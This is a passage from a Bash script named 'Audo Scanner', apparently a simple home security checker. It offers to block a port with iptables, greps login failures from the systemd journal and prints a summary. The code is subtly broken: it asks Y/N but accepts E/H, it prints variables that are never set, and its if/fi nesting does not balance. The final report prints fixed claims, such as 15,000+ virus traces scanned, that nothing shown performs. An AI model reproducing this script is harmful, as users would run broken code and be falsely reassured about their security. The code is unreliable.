    echo -e "AUDO_SCANNER | Your ip adress : '$ex_ipadresi'\n\nOpen ports:\n'$acik_portlar'\n\n DETECTED EXPLOIT INFORMATION:\n$exploitler" > "$exploit_cikti"
    cat "$exploit_cikti"
    yslx  " SAVED  :  $exploit_cikti"

    echo "Which exploited port do you want to close? If there is no exploited port in your IP address, leave it blank. :"
    read port_numarasi

    if [ -z "$port_numarasi" ]; then
        yslx  " You did not enter any Port number. Proceeding with the next process."
    else
        kirx  " Are you sure you want to turn off $port_number? This may cause undesirable results. (Y/N)"
        read cevap

        if [ "$cevap" == "E" ] || [ "$cevap" == "e" ]; then
            iptables -A INPUT -p tcp --dport $port_numarasi -j DROP
            yslx "Port $port_number has been successfully closed"
        elif [ "$cevap" == "H" ] || [ "$cevap" == "h" ]; then
            echo "[X] Port closure has been cancelled."
        else
             mavx  " Invalid response. Port closure has been cancelled."
          fi
        fi
      fi
  fi
fi

    echo -ne "\033]0;Audo Scanner | Testing abnormal log entries \a"
    sarx  " Checking for abnormal log entries... This process may take time"
    log_file="/var/log/journal/system.journal"
    anormal_girisler=$(timeout 20s journalctl -b -o cat -q -u systemd-logind.service | grep 'Failed\|Invalid')

    if [ -n "$anormal_girisler" ]; then
      echo "Abnormal log entries:"
      echo "$anormal_girisler"
    else
      yslx  " No abnormal log entry found."
      fx 10
    fi

bilgisayari_kapat_ayar="KAPALI"

if [ "$bilgisayari_kapat_ayar" == "ACIK" ]; then
  echo "The computer is shutting down..."
  shutdown -h now
fi

    bitis_zamani=$(date +%s)
    gecen_sure=$((bitis_zamani - baslangic_zamani))
    echo ""
    echo ""
    echo ""
    echo "----------------------------------------------------AUDO SCANNER | FINISHED!----------------------------------------------------"
    echo "LOG ;"
    yslx "Your system has been scanned for 15,000+ Virus traces and suspicious links"
    yslx "Detailed exploit scanned in your IP address"
    yslx "Suspicious links on your internet have been scanned"
    yslx "32 Risky ports were scanned in the IP address"
    yslx "... More '/reports/' "
    yslx ""
    yslx "Security checks finished!. Elapsed time: $elapsed_time seconds."
    echo ">>> All reports are saved in the '/reports/' folder. You can start the script again to return to the main menu."
    echo ""
    echo "You can send us your good/bad comments about Audio SCANNER via our DISCORD server! 'https://discord.gg/g4KBRZ5Ghz' "
    echo "Ender Community wishes you a good day."
    echo ""
    echo "Note: AUDO SCANNER will be closed automatically after 30 seconds."
    echo -ne "\033]0;Audo Scanner | Security checks completed! \a"
    fx 30
    echo -ne "\033]0;Audo Scanner | Anasayfa  \a"
    exit 1
  fi



